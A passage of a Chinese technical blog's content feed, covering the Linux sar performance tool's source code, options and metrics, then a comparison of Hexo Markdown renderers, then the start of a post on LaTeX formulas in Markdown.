title="2.2、sar显示统计信息"></a>2.2、sar显示统计信息</h3><ul><li>文件：<code>sar.c</code></li><li>核心函数&#x2F;代码：<ul><li><code>read_sadc_stat_bunch()</code>：读取<code>act</code>结构体中统计信息；</li><li><code>write_stats()</code>：调用每个<code>struct activity</code>的<code>f_print()</code>函数；</li><li><code>write_stats_avg()</code>：调用每个<code>struct activity</code>的<code>f_print_avg()</code>函数；</li></ul></li><li>代码解析：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sa.h</span><br><span class="hljs-type">__print_funct_t</span> (*f_print) (<span class="hljs-keyword">struct</span> activity *, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>);<br><span class="hljs-type">__print_funct_t</span> (*f_print_avg) (<span class="hljs-keyword">struct</span> activity *, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sar.c</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_sadc_stat_bunch</span><span class="hljs-params">(<span class="hljs-type">int</span> curr)</span><br>&#123;<br><span class="hljs-comment">/* 此处省略部分代码 */</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NR_ACT; i++) &#123;<br><span class="hljs-comment">/* 此处省略部分代码 */</span><br><span class="hljs-keyword">if</span> (sa_read(act[p]-&gt;buf[curr], act[p]-&gt;fsize * act[p]-&gt;nr * act[p]-&gt;nr2)) &#123;<br>print_read_error();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sar.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write_stats</span><span class="hljs-params">(<span class="hljs-type">int</span> curr, <span class="hljs-type">int</span> read_from_file, <span class="hljs-type">long</span> *cnt, <span class="hljs-type">int</span> use_tm_start,</span><br><span class="hljs-params"><span class="hljs-type">int</span> use_tm_end, <span class="hljs-type">int</span> reset, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> act_id)</span><br>&#123;<br><span class="hljs-comment">/* 此处省略部分代码 */</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NR_ACT; i++) &#123;<br><span class="hljs-keyword">if</span> ((act_id != ALL_ACTIVITIES) &amp;&amp; (act[i]-&gt;id != act_id))<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-keyword">if</span> (IS_SELECTED(act[i]-&gt;options) &amp;&amp; (act[i]-&gt;nr &gt; <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-comment">/* 显示当前活动统计信息 */</span><br>(*act[i]-&gt;f_print)(act[i], !curr, curr,<br>   NEED_GLOBAL_ITV(act[i]-&gt;options) ? g_itv : itv);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sar.c</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_stats_avg</span><span class="hljs-params">(<span class="hljs-type">int</span> curr, <span class="hljs-type">int</span> read_from_file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> act_id)</span><br>&#123;<br><span class="hljs-comment">/* 此处省略部分代码 */</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NR_ACT; i++) &#123;<br><span class="hljs-keyword">if</span> ((act_id != ALL_ACTIVITIES) &amp;&amp; (act[i]-&gt;id != act_id))<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-keyword">if</span> (IS_SELECTED(act[i]-&gt;options) &amp;&amp; (act[i]-&gt;nr &gt; <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-comment">/* 显示当前平均活动统计信息 */</span><br>(*act[i]-&gt;f_print_avg)(act[i], <span class="hljs-number">2</span>, curr,<br>       NEED_GLOBAL_ITV(act[i]-&gt;options) ? g_itv : itv);<br>&#125;<br>&#125;<br><span class="hljs-comment">/* 此处省略部分代码 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、参数解析"><a href="#三、参数解析" class="headerlink" title="三、参数解析"></a>三、参数解析</h2><h3 id="3-1、参数列表（演示版本为10-1-5）："><a href="#3-1、参数列表（演示版本为10-1-5）：" class="headerlink" title="3.1、参数列表（演示版本为10.1.5）："></a>3.1、参数列表（演示版本为<code>10.1.5</code>）：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz]# sar -V<br>sysstat version 10.1.5<br>(C) Sebastien Godard (sysstat &lt;at&gt; orange.fr)<br><br>[root@bugwz]# sar --<span class="hljs-built_in">help</span><br>Usage: sar [ options ] [ &lt;interval&gt; [ &lt;count&gt; ] ]<br>Options are:<br>[ -A ] [ -B ] [ -b ] [ -C ] [ -d ] [ -H ] [ -h ] [ -p ] [ -q ] [ -R ]<br>[ -r ] [ -S ] [ -t ] [ -u [ ALL ] ] [ -V ] [ -v ] [ -W ] [ -w ] [ -y ]<br>[ -I &#123; &lt;int&gt; [,...] | SUM | ALL | XALL &#125; ] [ -P &#123; &lt;cpu&gt; [,...] | ALL &#125; ]<br>[ -m &#123; &lt;keyword&gt; [,...] | ALL &#125; ] [ -n &#123; &lt;keyword&gt; [,...] | ALL &#125; ]<br>[ -j &#123; ID | LABEL | PATH | UUID | ... &#125; ]<br>[ -f [ &lt;filename&gt; ] | -o [ &lt;filename&gt; ] | -[0-9]+ ]<br>[ -i &lt;interval&gt; ] [ -s [ &lt;hh:mm:ss&gt; ] ] [ -e [ &lt;hh:mm:ss&gt; ] ]<br></code></pre></td></tr></table></figure><h3 id="3-2、参数含义解析："><a href="#3-2、参数含义解析：" class="headerlink" title="3.2、参数含义解析："></a>3.2、参数含义解析：</h3><ul><li><code>sar -c 1 10</code>：执行<code>sar -c</code>指令共<code>10次</code>，每隔<code>1秒</code>执行<code>1次</code>；</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">-A ：汇总所有的报告<br>-B ：分页状况<br>-b ：I/O 和传输速率信息状况<br>-C ：<br>-d ：块设备状况<br>-H ：<br>-h ：报告关于buffer使用的统计数据<br>-p ：调页活动的使用情况<br>-q ：队列长度和平均负载<br>-R ：内存状况<br>-r ：内存利用率<br>-S ：交换空间利用率<br>-t ：<br>-u ：CPU的利用率<br>-V ：版本信息<br>-v ：Kernel table 状况<br>-W ：交换信息<br>-w ：任务创建与系统转换统计信息<br>-y ：TTY 设备状况<br>-I ：中断信息状况<br>-P ：<br>-m ：电源管理信息状况<br>-n ：网络统计信息，格式为：&#123; &lt;keyword&gt; [,...] | ALL &#125;，keyword可以是：<br>     DEV          网卡<br>     EDEV         网卡(错误信息)<br>     NFS          NFS客户端<br>     NFSD         NFS服务器<br>     SOCK         Sockets     (v4)<br>     IP           IP流        (v4)<br>     EIP          IP流        (v4)(错误信息)<br>     ICMP         ICMP流      (v4)<br>     EICMP        ICMP流      (v4)(错误信息)<br>     TCP          TCP流       (v4)<br>     ETCP         TCP流       (v4)(错误信息)<br>     UDP          UDP流       (v4)<br>     SOCK6        Sockets     (v6)<br>     IP6          IP流        (v6)<br>     EIP6         IP流        (v6)(错误信息)<br>     ICMP6        ICMP流      (v6)<br>     EICMP6       ICMP流      (v6)(错误信息)<br>     UDP6         UDP流       (v6)<br>-j ：<br>-f ：<br>-o ：<br>-i ：<br>-s ：<br>-e ：<br></code></pre></td></tr></table></figure><h2 id="四、详细数据指标解析"><a href="#四、详细数据指标解析" class="headerlink" title="四、详细数据指标解析"></a>四、详细数据指标解析</h2><h3 id="4-1、查看CPU的利用率"><a href="#4-1、查看CPU的利用率" class="headerlink" title="4.1、查看CPU的利用率"></a>4.1、查看CPU的利用率</h3><p>指令：<code>sar -u</code>，该参数与<code>sar -C</code>，<code>sar -p</code>，<code>sar</code> 的输出信息一致。</p><p><img src="/assets/images/sar-u.png" alt="sar -u" loading="lazy"></p><p><strong>数据指标解析：</strong></p><ul><li><code>%user</code>：用户模式下消耗的CPU时间的比例；</li><li><code>%nice</code>：通过nice改变了进程调度优先级的进程，在用户模式下消耗的CPU时间的比例；</li><li><code>%system</code>：系统模式下消耗的CPU时间的比例；</li><li><code>%iowait</code>：CPU等待磁盘I&#x2F;O导致空闲状态消耗的时间比例；</li><li><code>%steal</code>：利用Xen等操作系统虚拟化技术，等待其它虚拟CPU计算占用的时间比例；</li><li><code>%idle</code>：CPU空闲时间比例；</li></ul><h3 id="4-2、队列长度和平均负载（队列信息）"><a href="#4-2、队列长度和平均负载（队列信息）" class="headerlink" title="4.2、队列长度和平均负载（队列信息）"></a>4.2、队列长度和平均负载（队列信息）</h3><p>指令：<code>sar -q</code>，查看运行队列中的进程数、系统上的进程大小、平均负载等，与其它命令相比，它能查看各项指标随时间变化的情况；</p><p><img src="/assets/images/sar-q.png" alt="sar -q" loading="lazy"></p><p><strong>数据指标解析：</strong></p><ul><li><code>runq-sz</code>：运行队列的长度（等待运行的进程数）；</li><li><code>plist-sz</code>：进程列表中进程（processes）和线程（threads）的数量；</li><li><code>ldavg-1</code>：最后1分钟的系统平均负载；</li><li><code>ldavg-5</code>：过去5分钟的系统平均负载；</li><li><code>ldavg-15</code>：过去15分钟的系统平均负载；</li><li><code>blocked</code>：</li></ul><h3 id="4-3、内存利用率"><a href="#4-3、内存利用率" class="headerlink" title="4.3、内存利用率"></a>4.3、内存利用率</h3><p>指令：<code>sar -r</code></p><p><img src="/assets/images/sar-r.png" alt="sar -r" loading="lazy"></p><p><strong>数据指标解析：</strong></p><ul><li><code>kbmemfree</code>：这个值和free命令中的free值基本一致，不包括buffer和cache的空间；</li><li><code>kbmemused</code>：这个值和free命令中的used值基本一致，包括buffer和cache的空间；</li><li><code>%memused</code>：物理内存使用率，这个值是kbmemused和内存总量(不包括swap)的一个百分比；</li><li><code>kbbuffers</code>：对应free命令中的buffer；</li><li><code>kbcached</code>：对应free命令中的cache；</li><li><code>kbcommit</code>：保证当前系统所需要的内存,即为了确保不溢出而需要的内存(RAM+swap)；</li><li><code>%commit</code>：这个值是kbcommit与内存总量(包括swap)的一个百分比；</li><li><code>kbactive</code>：</li><li><code>kbinact</code>：</li><li><code>kbdirty</code>：</li></ul><h3 id="4-4、页面交换情况"><a href="#4-4、页面交换情况" class="headerlink" title="4.4、页面交换情况"></a>4.4、页面交换情况</h3><p>指令：<code>sar -W</code>，页面发生交换时，服务器的吞吐量会大幅下降；服务器状况不良时，如果怀疑因为内存不足而导致了页面交换的发生，可以使用这个命令来确认是否发生了大量的交换；</p><p><img src="/assets/images/sar-W.png" alt="sar -W" loading="lazy"></p><p><strong>数据指标解析：</strong></p><ul><li>pswpin&#x2F;s：每秒系统换入的交换页面（swap page）数量；</li><li>pswpout&#x2F;s：每秒系统换出的交换页面（swap page）数量；</li></ul><h3 id="4-5、分页情况"><a href="#4-5、分页情况" class="headerlink" title="4.5、分页情况"></a>4.5、分页情况</h3><p>指令：<code>sar -B</code></p><p><img src="/assets/images/sar-B.png" alt="sar -B" loading="lazy"></p><p><strong>数据指标解析：</strong></p><ul><li>pgpgin&#x2F;s：</li><li>pgpgout&#x2F;s：</li><li>fault&#x2F;s：</li><li>majflt&#x2F;s：</li><li>pgfree&#x2F;s：</li><li>pgscank&#x2F;s：</li><li>pgscand&#x2F;s：</li><li>pgsteal&#x2F;s：</li><li>%vmeff：</li></ul><h3 id="4-6、I-O-和传输速率信息情况"><a href="#4-6、I-O-和传输速率信息情况" class="headerlink" title="4.6、I&#x2F;O 和传输速率信息情况"></a>4.6、I&#x2F;O 和传输速率信息情况</h3><p>指令：<code>sar -b</code></p><p><img src="/assets/images/sar-b-little.png" alt="sar -b" loading="lazy"></p><p><strong>数据指标解析：</strong></p><ul><li><code>tps</code>：每秒钟物理设备的 I&#x2F;O 传输总量；</li><li><code>rtps</code>：每秒钟从物理设备读入的数据总量；</li><li><code>wtps</code>：每秒钟向物理设备写入的数据总量；</li><li><code>bread/s</code>：每秒钟从物理设备读入的数据量，单位为 块&#x2F;s；</li><li><code>bwrtn/s</code>：每秒钟向物理设备写入的数据量，单位为 块&#x2F;s；</li></ul><h3 id="4-7、块设备信息"><a href="#4-7、块设备信息" class="headerlink" title="4.7、块设备信息"></a>4.7、块设备信息</h3><p>指令：<code>sar -d</code></p><p><img src="/assets/images/sar-d.png" alt="sar -d" loading="lazy"></p><p><strong>数据指标解析：</strong></p><ul><li><code>DEV</code>：正在监视的块设备；</li><li><code>tps</code>：每秒钟物理设备的 I&#x2F;O 传输总量；</li><li><code>rd_sec/s</code>：每秒从设备读取的扇区（sector）数量；</li><li><code>wr_sec/s</code>：每秒向设备写入的扇区（sector）数量；</li><li><code>avgrq-sz</code>：发给设备请求的平均扇区数；</li><li><code>avgqu-sz</code>：发给设备请求的平均队列长度；</li><li><code>await</code>：设备 I&#x2F;O 请求的平均等待时间（单位为毫秒）；</li><li><code>svctm</code>：设备 I&#x2F;O 请求的平均服务时间（单位为毫秒）；</li><li><code>%util</code>：在 I&#x2F;O 请求发送到设备期间，占用 CPU 时间的百分比，用于体现设备的带宽利用率；</li></ul><h3 id="4-8、大页信息"><a href="#4-8、大页信息" class="headerlink" title="4.8、大页信息"></a>4.8、大页信息</h3><p>指令：<code>sar -H</code></p><p><img src="/assets/images/sar-H.png" alt="sar -H" loading="lazy"></p><p><strong>数据指标解析：</strong></p><ul><li><code>kbhugfree</code>：</li><li><code>kbhugused</code>：</li><li><code>%hugused</code>：</li></ul><h3 id="4-9、内存状况"><a href="#4-9、内存状况" class="headerlink" title="4.9、内存状况"></a>4.9、内存状况</h3><p>指令：<code>sar -R</code></p><p><img src="/assets/images/sar-R-big.png" alt="sar -R" loading="lazy"></p><p><strong>数据指标解析：</strong></p><ul><li><code>frmpg/s</code>：每秒系统中空闲的内存页面（memory page freed）数量；</li><li><code>bufpg/s</code>：每秒系统中用作缓冲区（buffer）的附加内存页面（additional memory page）数量；</li><li><code>campg/s</code>：每秒系统中高速缓存的附加内存页面（additional memory pages cached）数量；</li></ul><h3 id="4-10、交换空间利用信息"><a href="#4-10、交换空间利用信息" class="headerlink" title="4.10、交换空间利用信息"></a>4.10、交换空间利用信息</h3><p>指令：<code>sar -S</code></p><p><img src="/assets/images/sar-S.png" alt="sar -S" loading="lazy"></p><p><strong>数据指标解析：</strong></p><ul><li><code>kbswpfree</code>：可用的空闲交换空间数量，单位为 KB；</li><li><code>kbswpused</code>：已使用的交换空间数量，单位为 KB；</li><li><code>kbswpcad</code>：交换空间的高速缓存使用的内存数量；</li><li><code>%swpcad</code>：</li></ul><h3 id="4-11、动态CPU信息"><a href="#4-11、动态CPU信息" class="headerlink" title="4.11、动态CPU信息"></a>4.11、动态CPU信息</h3><p>指令：<code>sar -t interval</code>，按照给定的<code>interval</code>的值，循环打印CPU的信息。</p><p><img src="/assets/images/sar-t-interval.png" alt="sar -t interval" loading="lazy"></p><p><strong>数据指标解析：</strong></p><ul><li><code>CPU</code>：all 表示统计信息为所有 CPU 的平均值；</li><li><code>%user</code>：显示在用户级别(application)运行使用 CPU 总时间的百分比；</li><li><code>%nice</code>：显示在用户级别，用于nice操作，所占用 CPU 总时间的百分比；</li><li><code>%system</code>：在核心级别(kernel)运行所使用 CPU 总时间的百分比；</li><li><code>%iowait</code>：显示用于等待I&#x2F;O操作占用 CPU 总时间的百分比；</li><li><code>%steal</code>：管理程序(hypervisor)为另一个虚拟进程提供服务而等待虚拟 CPU 的百分比；</li><li><code>%idle</code>：显示 CPU 空闲时间占用 CPU 总时间的百分比；</li></ul><h3 id="4-12、Kernel-Table-信息"><a href="#4-12、Kernel-Table-信息" class="headerlink" title="4.12、Kernel Table 信息"></a>4.12、Kernel Table 信息</h3><p>指令：<code>sar -v</code></p><p><img src="/assets/images/sar-v.png" alt="sar -v" loading="lazy"></p><p><strong>数据指标解析：</strong></p><ul><li><code>dentunusd</code>：目录高速缓存中未被使用的条目数量；</li><li><code>file-nr</code>：</li><li><code>inode-nr</code>：</li><li><code>pty-nr</code>：</li></ul><h3 id="4-13、任务创建与系统转换统计信息"><a href="#4-13、任务创建与系统转换统计信息" class="headerlink" title="4.13、任务创建与系统转换统计信息"></a>4.13、任务创建与系统转换统计信息</h3><p>指令：<code>sar -w</code></p><p><img src="/assets/images/sar-w-little.png" alt="sar-w" loading="lazy"></p><p><strong>数据指标解析：</strong></p><ul><li><code>proc/s</code>：每秒钟创建的进程数；</li><li><code>cswch/s</code>：</li></ul><h3 id="4-14、TTY-设备信息"><a href="#4-14、TTY-设备信息" class="headerlink" title="4.14、TTY 设备信息"></a>4.14、TTY 设备信息</h3><p>指令：<code>sar -y</code></p><p><img src="/assets/images/sar-Y.png" alt="sar -y" loading="lazy"></p><p><strong>数据指标解析：</strong></p><ul><li><code>TTY</code>：</li><li><code>rcvin/s</code>：每秒接收的中断数量；</li><li><code>xmtin/s</code>：每秒传送的中断数量；</li><li><code>framerr/s</code>：每秒发生的帧错误数（frame error）量；</li><li><code>prtyerr/s</code>：每秒发生的奇偶校验错误（parity error）数量；</li><li><code>brk/s</code>：每秒发生的暂停（break）数量；</li><li><code>ovrun/s</code>：每秒发生的溢出错误（overrun error）数量；</li></ul><h3 id="4-15、网络统计信息"><a href="#4-15、网络统计信息" class="headerlink" title="4.15、网络统计信息"></a>4.15、网络统计信息</h3><p>指令：<code>sar -n keyword</code>，其中<code>keyword</code>可选项如参数含义解析中所列。</p><p><img src="/assets/images/sar-n-keyword.png" alt="sar -n keyword" loading="lazy"></p><ul><li><code>IFACE</code>：</li><li><code>rxpck/s</code>：</li><li><code>txpck/s</code>：</li><li><code>rxKB/s</code>：</li><li><code>txKB/s</code>：</li><li><code>rxcmp/s</code>：</li><li><code>txcmp/s</code>：</li><li><code>rxmcst/s</code>：</li></ul><h3 id="4-16、性能问题排查技巧"><a href="#4-16、性能问题排查技巧" class="headerlink" title="4.16、性能问题排查技巧"></a>4.16、性能问题排查技巧</h3><ul><li>怀疑 CPU 存在瓶颈：可用<code>sar -u</code>和<code>sar -q</code>等来查看</li><li>怀疑内存存在瓶颈：可用<code>sar -B</code>、<code>sar -r</code>和<code>sar -W</code>等来查看</li><li>怀疑 I&#x2F;O 存在瓶颈：可用<code>sar -b</code>、<code>sar -u</code>和<code>sar -d</code>等来查看</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 常用命令 </tag>
            
            <tag> sar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo的多种Markdown渲染器对比分析</title>
      <link href="/2019/09/17/hexo-markdown-renderer/"/>
      <url>/2019/09/17/hexo-markdown-renderer/</url>
      
        <content type="html"><![CDATA[<p>Hexo 作为一个优秀的 Markdown 博客框架，自然也诞生了很多适用的 Markdown 渲染器，这里对比分析一下 Hexo 下几种常用的 Markdown 渲染器： <code>hexo-renderer-marked</code> ， <code>hexo-renderer-kramed</code> ， <code>hexo-renderer-pandoc</code> ， <code>hexo-renderer-markdown-it</code> ， <code>hexo-renderer-markdown-it-plus</code> ，本文使用的渲染器为： <code>hexo-renderer-markdown-it-plus</code> 。</p><h2 id="一、详细介绍"><a href="#一、详细介绍" class="headerlink" title="一、详细介绍"></a>一、详细介绍</h2><h3 id="1-1、hexo-renderer-marked"><a href="#1-1、hexo-renderer-marked" class="headerlink" title="1.1、hexo-renderer-marked"></a>1.1、hexo-renderer-marked</h3><p>Hexo默认的Markdown的渲染器，针对于普通的Markdown的文章书写，该渲染器已经足够，但是由于不支持Mathjax，不支持插件扩展，不支持emoji表情，所以该渲染器也是介绍的渲染器中功能最弱的。</p><ul><li><p>GitHub地址：<a href="https://github.com/hexojs/hexo-renderer-marked">hexojs&#x2F;hexo-renderer-marked</a></p></li><li><p>NPM地址：<a href="https://www.npmjs.com/package/hexo-renderer-marked">hexo-renderer-marked</a></p><ul><li><code>版本</code>：2.0.0</li><li><code>最近提交</code>：a month ago</li><li><code>依赖</code>：<a href="https://www.npmjs.com/package/hexo-util">hexo-util</a>，<a href="https://www.npmjs.com/package/marked">marked</a>，<a href="https://www.npmjs.com/package/strip-indent">strip-indent</a></li></ul></li><li><p>安装方式：<code>npm install hexo-renderer-marked —save</code></p></li></ul><h3 id="1-2、hexo-renderer-kramed"><a href="#1-2、hexo-renderer-kramed" class="headerlink" title="1.2、hexo-renderer-kramed"></a>1.2、hexo-renderer-kramed</h3><p>基于hexo-renderer-marked二次开发的渲染器，完善了对Mathjax的支持，仍然不支持插件的扩展，不支持emoji表情。</p><ul><li><p>GitHub地址：<a href="https://github.com/sun11/hexo-renderer-kramed">sun11&#x2F;hexo-renderer-kramed</a></p></li><li><p>NPM地址：<a href="https://www.npmjs.com/package/hexo-renderer-kramed">hexo-renderer-kramed</a></p><ul><li><code>版本</code>：0.1.4</li><li><code>最近提交</code>：2 years ago</li><li><code>依赖</code>：<a href="https://www.npmjs.com/package/hexo-util">hexo-util</a>、<a href="https://www.npmjs.com/package/kramed">kramed</a>、<a href="https://www.npmjs.com/package/object-assign">object-assign</a>、<a href="https://www.npmjs.com/package/strip-indent">strip-indent</a></li></ul></li><li><p>安装方式：<code>npm install hexo-renderer-kramed --save</code></p></li></ul><h3 id="1-3、hexo-renderer-pandoc"><a href="#1-3、hexo-renderer-pandoc" class="headerlink" title="1.3、hexo-renderer-pandoc"></a>1.3、hexo-renderer-pandoc</h3><p>与hexo-renderer-marked类似，支持Mathjax语法，不仅可以渲染markdown，还支持textile，reStructedText和许多其他格式，仍然不支持emoji表情；内建的汇总文件<code>db.json</code>将来可能会非常大，同步到 Github 可能会比较慢，博客内建的搜索功能也可能会变得非常慢。</p><ul><li><p>GitHub地址：<a href="https://github.com/wzpan/hexo-renderer-pandoc">wzpan&#x2F;hexo-renderer-pandoc</a></p></li><li><p>NPM地址：<a href="https://www.npmjs.com/package/hexo-renderer-pandoc">hexo-renderer-pandoc</a></p><ul><li><code>版本</code>：0.1.4</li><li><code>最近提交</code>：2 years ago</li><li><code>依赖</code>：无</li></ul></li><li><p>安装方式：<code>npm install hexo-renderer-pandoc --save</code></p></li></ul><h3 id="1-4、hexo-renderer-markdown-it"><a href="#1-4、hexo-renderer-markdown-it" class="headerlink" title="1.4、hexo-renderer-markdown-it"></a>1.4、hexo-renderer-markdown-it</h3><p>支持Mathjax语法（支持不太好），支持Markdown以及CommonMark语法，渲染速度比hexo-renderer-marked快，支持插件配置，支持标题带安全的id信息，支持脚注（上标，下标，下划线）。</p><ul><li><p>GitHub地址：<a href="https://github.com/hexojs/hexo-renderer-markdown-it">hexojs&#x2F;hexo-renderer-markdown-it</a></p></li><li><p>NPM地址：<a href="https://www.npmjs.com/package/hexo-renderer-markdown-it">hexo-renderer-markdown-it</a></p><ul><li><code>版本</code>：3.4.1</li><li><code>最近提交</code>：4 years ago</li><li><code>依赖</code>：较多…</li></ul></li><li><p>安装方式：<code>npm i hexo-renderer-markdown-it —save</code></p></li></ul><h3 id="1-5、hexo-renderer-markdown-it-plus"><a href="#1-5、hexo-renderer-markdown-it-plus" class="headerlink" title="1.5、hexo-renderer-markdown-it-plus"></a>1.5、hexo-renderer-markdown-it-plus</h3><p>支持Katex插件并默认启用，默认启用插件列表：<code>markdown-it-emoji</code>，<code>markdown-it-sub</code>，<code>markdown-it-sup</code>，<code>markdown-it-deflist</code>，<code>markdown-it-abbr</code>，<code>markdown-it-footnote</code>，<code>markdown-it-ins</code>，<code>markdown-it-mark</code>，<code>@iktakahiro/markdown-it-katex</code>，<code>markdown-it-toc-and-anchor</code>。</p><ul><li><p>GitHub地址：<a href="https://github.com/CHENXCHEN/hexo-renderer-markdown-it-plus">CHENXCHEN&#x2F;hexo-renderer-markdown-it-plus</a></p></li><li><p>NPM地址：<a href="https://www.npmjs.com/package/hexo-renderer-markdown-it-plus">hexo-renderer-markdown-it-plus</a></p><ul><li><code>版本</code>：1.0.4</li><li><code>最近提交</code>：a year ago</li><li><code>依赖</code>：<a href="https://www.npmjs.com/package/%40iktakahiro%2Fmarkdown-it-katex">@iktakahiro&#x2F;markdown-it-katex</a>，<a href="https://www.npmjs.com/package/clone">clone</a>，<a href="https://www.npmjs.com/package/highlight.js">highlight.js</a>，<a href="https://www.npmjs.com/package/markdown-it">markdown-it</a>，<a href="https://www.npmjs.com/package/markdown-it-abbr">markdown-it-abbr</a>，<a href="https://www.npmjs.com/package/markdown-it-deflist">markdown-it-deflist</a>，<a href="https://www.npmjs.com/package/markdown-it-emoji">markdown-it-emoji</a>，<a href="https://www.npmjs.com/package/markdown-it-footnote">markdown-it-footnote</a>，<a href="https://www.npmjs.com/package/markdown-it-ins">markdown-it-ins</a>，<a href="https://www.npmjs.com/package/markdown-it-mark">markdown-it-mark</a>，<a href="https://www.npmjs.com/package/markdown-it-sub">markdown-it-sub</a>，<a href="https://www.npmjs.com/package/markdown-it-sup">markdown-it-sup</a>，<a href="https://www.npmjs.com/package/markdown-it-toc">markdown-it-toc</a>，<a href="https://www.npmjs.com/package/uslug">uslug</a></li></ul></li><li><p>安装方式：<code>npm i hexo-renderer-markdown-it-plus —save</code></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown中支持LaTex数学公式</title>
      <link href="/2019/09/14/markdown-latex/"/>
      <url>/2019/09/14/markdown-latex/</url>
      
        <content type="html"><![CDATA[<h1 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h1><p>Markdown在目前无疑是一个比较好的写作方式，但是它时候和大部分的写作软件一样，在一些数据公式的编写上，只能引入图片呢？除了引用图片之外是不是还有更好的数学公式编辑手段呢？这里主要介绍一下LaTex Math在Markdown上的支持。</p><p>本博客目前采用<a href="https://github.com/sun11/hexo-renderer-kramed">hexo-renderer-kramed</a>渲染器替换了Hexo自带的hexo-renderer-marked渲染器来支持LaTex；</p><h3 id="LaTex介绍"><a href="#LaTex介绍" class="headerlink" title="LaTex介绍"></a>LaTex介绍</h3><p><a href="https://www.latex-project.org/">LaTex</a>是一种基于TeX的排版系统，LaTeX使用TeX作为它的格式化引擎，LaTeX遵循呈现与内容分离的设计理念，以便作者可以专注于他们正在编写的内容，而不必同时注视其外观。在准备LaTeX文档时，作者使用章（chapter）、节（section）、表（table）、图（figure）等简单的概念指定文档的逻辑结构，并让LaTeX系统负责这些结构的格式和布局。因此，它鼓励从内容中分离布局，同时仍然允许在需要时进行手动排版调整。这个概念类似于许多文字处理器允许全局定义整个文档的样式的机制，或使用层叠样式表来规定HTML的样式。LaTeX系统是一种可以处理排版和渲染的标记语言。</p><h1 id="二、Markdown的Latex规则"><a href="#二、Markdown的Latex规则" class="headerlink" title="二、Markdown的Latex规则"></a>二、Markdown的Latex规则</h1><h2 id="2-1、行内与独行"><a href="#2-1、行内与独行" class="headerlink" title="2.1、行内与独行"></a>2.1、行内与独行</h2><ul><li><p><code>行内公式</code>：将公式插入到本行内，格式为<code>$公式内容$</code>，如：<code>$xyz$</code>，展示效果为：$xyz$；</p></li><li><p><code>独行公式</code>：将公式居中插入到新的一行内，格式为<code>$$公式内容$$</code>，如：<code>$$xyz$$</code>，展示效果为：</p><p>$$xyz$$</p></li></ul><h2 id="2-2、上标、下标与组合"><a href="#2-2、上标、下标与组合" class="headerlink" title="2.2、上标、下标与组合"></a>2.2、上标、下标与组合</h2><ul><li><code>上标符号</code>：格式为<code>^</code>，如：<code>$x^4$</code>，展示效果为：$x^4$；</li><li><code>下标符号</code>：格式为<code>_</code>，如：<code>$x_1$</code>，展示效果为：$x_1$；</li><li><code>组合符号</code>：格式为<code>{}</code>，如：<code>${16}_{8}O{2+}_{2}$</code>，展示效果为：${16}<em>{8}O{2+}</em>{2}$；</li></ul><h2 id="2-3、汉字、字体与格式"><a href="#2-3、汉字、字体与格式" class="headerlink" title="2.3、汉字、字体与格式"></a>2.3、汉字、字体与格式</h2><ul><li><code>汉字形式</code>：格式为<code>\mbox{}</code>，如：<code>$V_{\mbox{初始}}$</code>，展示效果为：$V_{\mbox{初始}}$；</li><li><code>字体控制</code>：格式为<code>\displaystyle</code>，如：<code>$\displaystyle \frac{x+y}{y+z}$</code>，展示效果为：$\displaystyle \frac{x+y}{y+z}$；</li><li><code>下划线符号</code>：格式为<code>\underline</code>，如：<code>$\underline{x+y}$</code>，展示效果为：$\underline{x+y}$；</li><li><code>标签</code>：格式为<code>\tag{数字}</code>，如：<code>$\tag{11}$</code>，展示效果为：$\tag{11}$；</li><li><code>上大括号</code>：格式为<code>\overbrace{算式}</code>，如：<code>$\overbrace{a+b+c+d}^{2.0}$</code>，展示效果为：$\overbrace{a+b+c+d}^{2.0}$；</li><li><code>下大括号</code>：格式为<code>\underbrace{算式}</code>，如：<code>$a+\underbrace{b+c}_{1.0}+d$</code>，展示效果为：$a+\underbrace{b+c}_{1.0}+d$；</li><li><code>上位符号</code>：格式为<code>\stacrel{上位符号}{基位符号}</code>，如：<code>$\vec{x}\stackrel{\mathrm{def}}{=}{x_1,\dots,x_n}$</code>，展示效果为：$\vec{x}\stackrel{\mathrm{def}}{&#x3D;}{x_1,\dots,x_n}$；</li></ul><h2 id="2-4、占位符"><a href="#2-4、占位符" class="headerlink" title="2.4、占位符"></a>2.4、占位符</h2><ul><li><code>两个quad空格</code>：格式为<code>\qquad</code>，如：<code>$x \qquad y$</code>，展示效果为：$x \qquad 